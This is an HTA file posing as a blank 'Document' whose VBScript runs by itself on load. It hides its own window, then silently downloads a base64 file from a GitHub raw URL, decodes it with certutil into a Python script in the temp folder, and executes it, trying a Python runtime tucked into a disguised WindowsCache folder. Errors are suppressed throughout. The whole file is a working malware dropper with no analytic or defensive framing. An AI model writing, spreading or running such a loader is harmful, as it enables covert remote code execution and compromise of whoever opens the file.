<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8"/>
<title>Document</title>
<HTA:APPLICATION ID="a" APPLICATIONNAME="Document" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
<script language="VBScript">
Sub Window_OnLoad
  On Error Resume Next
  window.resizeTo 0, 0
  window.moveTo -32000, -32000
  Dim sh, cmd
  Set sh = CreateObject("WScript.Shell")
  cmd = "cmd /c curl -sL -o ""%TEMP%\s.b64"" ""https://raw.githubusercontent.com/manotuslk2-web/profile/refs/heads/main/string.txt"" & certutil -decode ""%TEMP%\s.b64"" ""%TEMP%\s.py"" >nul 2>&1 & if exist ""%TEMP%\pye\python.exe"" (""%TEMP%\pye\python.exe"" ""%TEMP%\s.py"") else (if exist ""%LOCALAPPDATA%\Microsoft\WindowsCache\py_runtime\pythonw.exe"" (""%LOCALAPPDATA%\Microsoft\WindowsCache\py_runtime\pythonw.exe"" ""%TEMP%\s.py"") else (python ""%TEMP%\s.py""))"
  sh.Run cmd, 0, False
  window.close
End Sub
</script>
</head>
<body></body>
</html>
